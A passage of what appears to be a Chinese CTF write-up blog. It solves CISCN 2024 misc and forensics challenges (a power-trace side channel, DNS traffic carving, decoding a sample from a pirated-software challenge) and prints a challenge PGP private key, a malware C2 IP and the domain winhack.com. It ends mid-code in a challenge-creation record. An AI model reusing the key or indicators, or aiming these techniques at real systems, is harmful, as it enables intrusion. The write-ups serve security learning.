        <content type="html"><![CDATA[<h3 id="火锅链观光打卡"><a class="markdownIt-Anchor" href="#火锅链观光打卡"></a> 火锅链观光打卡</h3><p>签到题</p><h3 id="power-trajectory-diagram"><a class="markdownIt-Anchor" href="#power-trajectory-diagram"></a> Power Trajectory Diagram</h3><p>下载得到attachment.npz文件，发现有四部分数据，通过查看 input 和 index 后可以知道<br>题目是一共爆破了13个字符，每个字符爆破了40次，然后每次爆破都会有一条 trace<br>写一个 python 脚本读取 trace 数据并画折线图，发现每条 trace 都会有一个最小值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> np<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'attachment.npz'</span><span class="token punctuation">)</span>trace <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'trace'</span><span class="token punctuation">]</span><span class="token builtin">input</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token comment"># print(input) 十三组打印字符串，每组字符串个数是40个，一共5200个字符串</span>index <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">]</span><span class="token comment"># print(index) 内容是1-12.</span><span class="token comment"># print(trace) 520个数组，每个数组应该是功耗变化值，对应input的字符，其中每组变化最大的就是密码中的字符</span>num_groups <span class="token operator">=</span> <span class="token number">13</span> group_size <span class="token operator">=</span> <span class="token number">40</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    table <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">40</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">min</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>argmin<span class="token punctuation">(</span>trace<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">40</span><span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">)</span>        <span class="token comment"># print(res) 提取res中最大值来确定爆破字符的index</span>    index <span class="token operator">=</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    char <span class="token operator">=</span> table<span class="token punctuation">[</span>index<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>char<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment">#_ciscn_2024_</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="神秘文件"><a class="markdownIt-Anchor" href="#神秘文件"></a> 神秘文件</h3><p>太难找了<br>part3 运用了宏编辑<br>alt+f11打开宏编辑页面</p><p>然后 base64 的RC4 解码 然后base64<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925897.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925898.png" alt></p><h3 id="通风机"><a class="markdownIt-Anchor" href="#通风机"></a> 通风机</h3><p>STEP7 MicroWIN V4.0 SP9 软件打开然后在 symbol table 中发现 base64 编码后的 flag，CyberChef 解码即可得到 flag</p><h3 id="tough_dns"><a class="markdownIt-Anchor" href="#tough_dns"></a> Tough_DNS</h3><p>题目内容：DNS的世界充满了多变的字符，接下来我将直接给你答案：56 16 26 93 66 53 16 56 d2 03 26 93 56<br>题目给了一个DNS流量包，发现有的包中有二进制数据，导出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tshark <span class="token operator">-</span>r <span class="token number">1</span><span class="token punctuation">.</span>pcapng <span class="token operator">-</span>T fields <span class="token operator">-</span>e dns<span class="token punctuation">.</span>qry<span class="token punctuation">.</span>name <span class="token operator">|</span> sed <span class="token string">'/^\s*$/d'</span> <span class="token operator">|</span> uniq <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后将其转为二维码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token comment"># 新建一个列表来保存奇数行</span>odd_lines <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># 打开文件并读取行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 如果行号是奇数（索引是偶数），则保留该行</span>        <span class="token keyword">if</span> index <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            odd_lines<span class="token punctuation">.</span>append<span class="token punctuation">(</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 将处理后的奇数行合并为一个字符串</span>s <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> line <span class="token keyword">in</span> odd_lines<span class="token punctuation">:</span>    s <span class="token operator">+=</span>line  <span class="token comment"># 使用 += 运算符来拼接字符串</span><span class="token comment"># 然后继续按照原逻辑处理字符串s</span>MAX <span class="token operator">=</span> <span class="token number">21</span>i <span class="token operator">=</span> <span class="token number">0</span>pic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">></span> i<span class="token punctuation">:</span>  <span class="token comment"># 确保索引没有超出字符串s的长度</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span>pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'fl.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>扫码得到<br>15f9792dba5c<br>明显不是flag，继续看流量包，发现txt解析记录将其提取出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tshark<span class="token punctuation">.</span>exe <span class="token operator">-</span>r Tough_DNS<span class="token punctuation">.</span>pcapng <span class="token operator">-</span>T fields <span class="token operator">-</span>e dns<span class="token punctuation">.</span>txt <span class="token operator">-</span>Y <span class="token string">"(dns.txt.length == 1) &amp;&amp; (dns.id == 0x4500)"</span><span class="token operator">|</span>tr <span class="token operator">-</span>d <span class="token string">"\n"</span> <span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">.</span>txt tshark<span class="token punctuation">.</span>exe <span class="token operator">-</span>r Tough_DNS<span class="token punctuation">.</span>pcapng <span class="token operator">-</span>T fields <span class="token operator">-</span>e dns<span class="token punctuation">.</span>txt <span class="token operator">-</span>Y <span class="token string">"(dns.txt.length == 1) &amp;&amp; (dns.id == 0x6421)"</span><span class="token operator">|</span>tr <span class="token operator">-</span>d <span class="token string">"\n"</span> <span class="token operator">>></span><span class="token number">3</span><span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到两个文件，2.条txt文件发现是一个zip，那么猜测二维码扫出来的是密码。</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925899.png" alt></p><p>得到secret.gpg</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>BEGIN PGP PRIVATE KEY BLOCK<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Version<span class="token punctuation">:</span> GnuPG v1lQIGBGR0mdUBBACYjdQSFv<span class="token operator">/</span>9VkDcH406ee9a01IpIYv2tJkTu4WuEzh3cb52B<span class="token operator">+</span>vTFRbgC3MMohKL41potPMTVM6U4cisg0gTPnQeIk37R5A47g03gPRJxO6SBrolsM7WibfPpqT2dyQnsW8xfU7gxoiPoDQ16OeJzzM8GFhMbkNccBOOETgo9yTTOwARAQAB<span class="token operator">/</span>gcDArSnU3JKy53PYEuZt6Ur4DafWuUXztAfuzKkNwJCwhE9xGFGSWlo4whjOhzyJaUGRL2ToiihW1JPlkvW59<span class="token operator">/</span>my2X5DuvblMnMDilMYVzQzHcg0C0rVRpD97FNeZJGZfQnzQomF1a4<span class="token operator">/</span>kz5jc1IpmMAxKLjJjkptXcI6vf72Hb9Rs07lrOYmBE2dc8OC8WjP<span class="token operator">/</span>2vsAhHUxywWAQEG4ATXklAvBdipERfCU4aHW2GMsvlV1ncnp0MBuXjQeqCWt7i9RYgIkvptZWl2Y8AtK5NsXZ0kZvKv<span class="token operator">/</span>4GxJUZ5tmRep3YEbBlK2EihqLxALiPvMd<span class="token operator">+</span>yUmYnht5SZB67ZwbnwBwAdKLTvV03Rm8ZoTeg<span class="token operator">+</span>EzLBXH7kj0Pl4<span class="token operator">/</span>pnXiKvDgCS<span class="token operator">/</span><span class="token number">6</span>IwP4h0sIx1H<span class="token operator">/</span><span class="token number">4</span><span class="token operator">/</span>8AkJ<span class="token operator">/</span>ivrOxPhm<span class="token operator">+</span>FZ15ct64x54Ae27Hy7zjHwkCu5MMQ1smbQ<span class="token operator">/</span>eWbArOtJHJ6hKWI<span class="token operator">/</span>CuA<span class="token operator">+</span>0EBEQNNBUetx0dub<span class="token operator">+</span>vazAyaQB1h8VXw7Y9aq0HmN0ZmVyIChub25lKSA8Y3RmZXJAZ21haWwuY29tPoi4BBMBAgAiBQJkdJnVAhsDBgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAAKCRDNNPbFh<span class="token operator">+</span>VSkJjJBACFSEjtR6BQg3MCkrpt9vwW9Opb1BXBrUKUD5z4od2enZwOPw<span class="token operator">/</span>fRaiC2npr<span class="token operator">+</span>DiGQ4XyIQzwsyn6Gx62h1UQSgGk4MLy<span class="token operator">/</span>9ffEIYJHJAgU<span class="token operator">+</span>ouEu<span class="token operator">+</span>OWsk<span class="token operator">+</span>VUJND5dHimIxyePgjHm<span class="token operator">+</span>7NTr6CgFnflNOe2PeqmsOEcRNDSk5LNQ<span class="token operator">/</span>L9UQJ0CBgRkdJnVAQQA4my1wcQGuuJ6dKxg62QBFy7WN<span class="token operator">/</span>cJnnWm0W0l<span class="token operator">/</span>3LWDfRZq<span class="token operator">/</span>Lk1wMmp9hBj16yRoh9EBvgQCz1de2Rx6TjvvOVUw0jLyumHVIzetbjnQbMHWA1xLXSarDu9u3ZT2zwXV<span class="token operator">/</span>vo4VukIlDIEayOshVrmk9VOMfbngf<span class="token operator">//</span>aDmRwsgj6ZIQMAEQEAAf4HAwK0p1NySsudz2C4Whqn6GQ8PMIyoqV8Y94up9<span class="token operator">+</span>Qq34FiOgquLqetKoNNaG2M5KJJB77W9Yzt8dM0A09wCpObA9mTCW0SI4N6MJFOdvY6jpG844uHI6L2IKMFZQTdDwvfgMPpGjLHM7<span class="token operator">/</span>ho3dpec9BKDihQDeCrWl3tfyWAh68pHPXYyMmTu51iGfkNCEv<span class="token operator">+</span>SEHlqq0PsLbGT9DxwDWGPzCzvjpY79Uv1cS5IwIwI6aaccUjsoobvdqD8HJY2B4JGj1XY2oHrZDPH<span class="token operator">/</span>OwgPMwArbHtHqgd632BxN9Ofl0sNzas41LB731RUcP79M7wWQPIbhx61ubIZPtejqa<span class="token operator">/</span>P5u0gRpFKyHo6tW9t<span class="token operator">/</span>al5OL9F2vFhl63Hm1Us6XScduWZM9pmd3tEwarHVsBt4z<span class="token operator">+</span>BIgJJKDvKWs9dgw2aQhKprwNKErMUfhiVuw0uTJBS2F4JsPjKdF7hp3mk7wiVGloCy0<span class="token operator">+</span>c4l0EL<span class="token operator">+</span>U<span class="token operator">/</span>9N1EGD7yK2NKDZFB4i1srW2aiJ8EGAECAAkFAmR0mdUCGwwACgkQzTT2xYflUpBfEwP<span class="token operator">+</span>I1x7DspB3GnQAFvXVtkmpi1ASEMQtbCMgexx4<span class="token operator">+</span>PuqbbUNKOFr83mBkzCQkuh5lrHEZfpvKN<span class="token operator">/</span>A1X8AvCxxZu<span class="token operator">/</span>m9rS8nZQ<span class="token operator">/</span>BNt7qAG6DjBXrWycWn2swYtMIzys<span class="token operator">/</span>CsKkhg33hOiHcehkCXX0Jd8TmE664iLs1WUVHzXK<span class="token operator">/</span>v5h4XA1o<span class="token operator">=</span><span class="token operator">=</span>Izki<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>END PGP PRIVATE KEY BLOCK<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出是一个pgp加密的公钥，那另一个是密文了，将其转为16进制导出。</p><p>然后题目给的是私钥了：56 16 26 93 66 53 16 56 d2 03 26 93 56<br>将其反转并转ascii</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> string <span class="token keyword">import</span> printable<span class="token comment"># for item in printable:</span><span class="token comment">#     print(ord(item), end=' ')</span><span class="token comment"># 48 49 50 51 52 53 54 55 56 57 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 58 59 60 61 62 63 64 91 92 93 94 95 96 123 124 125 126 32 9 10 13 11 12</span><span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    passwd <span class="token operator">=</span> <span class="token string">''</span>    enc_passwds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'56'</span><span class="token punctuation">,</span> <span class="token string">'16'</span><span class="token punctuation">,</span> <span class="token string">'26'</span><span class="token punctuation">,</span> <span class="token string">'93'</span><span class="token punctuation">,</span> <span class="token string">'66'</span><span class="token punctuation">,</span> <span class="token string">'53'</span><span class="token punctuation">,</span>                   <span class="token string">'16'</span><span class="token punctuation">,</span> <span class="token string">'56'</span><span class="token punctuation">,</span> <span class="token string">'d2'</span><span class="token punctuation">,</span> <span class="token string">'03'</span><span class="token punctuation">,</span> <span class="token string">'26'</span><span class="token punctuation">,</span> <span class="token string">'93'</span><span class="token punctuation">,</span> <span class="token string">'56'</span><span class="token punctuation">]</span>    <span class="token comment"># for item in enc_passwds:</span>    <span class="token comment">#     print(int(item, 16), end=" ")</span>    <span class="token comment"># # 86 22 38 147 102 83 22 86 210 3 38 147 86</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> enc_passwds<span class="token punctuation">:</span>        item <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token comment"># print(int(item,16),end=" ")</span>        <span class="token comment"># 101 97 98 57 102 53 97 101 45 48 98 57 101</span>        passwd <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> passwd<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    passwd <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token comment"># eab9f5ae-0b9e</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进行解码即可得到flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">gpg <span class="token operator">-</span><span class="token operator">-</span><span class="token keyword">import</span> secret<span class="token punctuation">.</span>gpggpg<span class="token punctuation">:</span> <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>gnupg<span class="token operator">/</span>trustdb<span class="token punctuation">.</span>gpg：建立了信任度数据库gpg<span class="token punctuation">:</span> 密钥 CD34F6C587E55290：公钥 “ctfer <span class="token punctuation">(</span>none<span class="token punctuation">)</span> <span class="token operator">&lt;</span>ctfer@gmail<span class="token punctuation">.</span>com<span class="token operator">></span>” 已导入gpg<span class="token punctuation">:</span> 密钥 CD34F6C587E55290：私钥已导入gpg<span class="token punctuation">:</span> 处理的总数：<span class="token number">1</span>gpg<span class="token punctuation">:</span>               已导入：<span class="token number">1</span>gpg<span class="token punctuation">:</span>       读取的私钥：<span class="token number">1</span>gpg<span class="token punctuation">:</span>   导入的私钥：<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"> gpg <span class="token operator">-</span>d out<span class="token punctuation">.</span>txtgpg<span class="token punctuation">:</span> 由 <span class="token number">1024</span> 位的 RSA 密钥加密，标识为 51457644D5D8B1B5，生成于 <span class="token number">2023</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">29</span>      “ctfer <span class="token punctuation">(</span>none<span class="token punctuation">)</span> <span class="token operator">&lt;</span>ctfer@gmail<span class="token punctuation">.</span>com<span class="token operator">></span>”flag<span class="token punctuation">&#123;</span>79830a47<span class="token operator">-</span>faf7<span class="token operator">-</span><span class="token number">4067</span><span class="token operator">-</span>b585<span class="token operator">-</span>145776f833cd<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925900.png" alt></p><h3 id="盗版软件"><a class="markdownIt-Anchor" href="#盗版软件"></a> 盗版软件</h3><p>得到一个exe文件和一个dmp文件，运行exe文件后得到一张图片，发现其上方有点<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925901.png" alt><br>在全红是可以看出有zip，但是中间有垃圾数据，提取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>i <span class="token operator">=</span> <span class="token number">8</span><span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">2</span><span class="token comment"># print(res)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.zip'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到一个.b文件，进行base85解码<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925902.png" alt><br>然后在云沙箱运行<br><a href="https://s.threatbook.com/report/file/a97946c34d2d8642820f196a54a6e8d78cf4f58a97e417be9696d7fd19e7fc95">https://s.threatbook.com/report/file/a97946c34d2d8642820f196a54a6e8d78cf4f58a97e417be9696d7fd19e7fc95</a></p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925903.png" alt><br>得到 IP : 39.100.72.235<br>但是dmp用vol提取不出来东西，使用010，utf-8编码<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030925904.png" alt><br>得到 <a href="http://winhack.com">winhack.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>出题记录</title>
      <link href="/2024/05/15/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/05/15/%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="ez"><a class="markdownIt-Anchor" href="#ez"></a> ez</h3><p>据曾经做过的一个题目，需要python像素旋转。</p><p>使用PIL库对图片每一行像素进行循环移位：备份每一行的像素值，计算一个随机的起始点，然后对这一行的像素进行循环移位，最后保存并显示处理后的图像。通过这种方式，图像的每一行都会有一个随机的循环移位效果。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> random <span class="token keyword">import</span> randintf <span class="token operator">=</span> <span class="token string">"C:\\Users\\86157\\Desktop\\新建文件夹4\\新建文件夹 (2)\\1123.png"</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>pixels <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    back_row <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        back_row<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pixels<span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> img<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pixels<span class="token punctuation">[</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> start<span class="token punctuation">)</span> <span class="token operator">%</span> img<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> back_row<span class="token punctuation">[</span>j<span class="token punctuation">]</span>img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"C:\\Users\\86157\\Desktop\\新建文件夹4\\新建文件夹 (2)\\f11.png"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由<img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030920129.png" alt></p><p>得到</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406030920130.png" alt></p><h4 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> wp：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image  <span class="token comment"># 导入处理图片的库</span><span class="token comment"># 定义一个函数，用于根据指定位置对像素行进行循环移位</span><span class="token keyword">def</span> <span class="token function">rotate_pixels</span><span class="token punctuation">(</span>pixels<span class="token punctuation">,</span> pivot<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""根据pivot点旋转像素"""</span>    <span class="token keyword">return</span> pixels<span class="token punctuation">[</span>pivot<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> pixels<span class="token punctuation">[</span><span class="token punctuation">:</span>pivot<span class="token punctuation">]</span><span class="token comment"># 图片路径</span>image_path <span class="token operator">=</span> <span class="token string">'f1123.png'</span><span class="token comment"># 打开图片并转换为RGB模式，获取图片的宽度和高度</span>p <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>image_path<span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>width<span class="token punctuation">,</span> height <span class="token operator">=</span> p<span class="token punctuation">.</span>size<span class="token comment"># 读取图片的所有像素到一个二维列表中</span>pixels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>p<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 初始化一个列表，用于存储每行颜色变化的像素索引</span>change_indices <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># 遍历每行像素，寻找首个红色像素后颜色变化的位置</span><span class="token 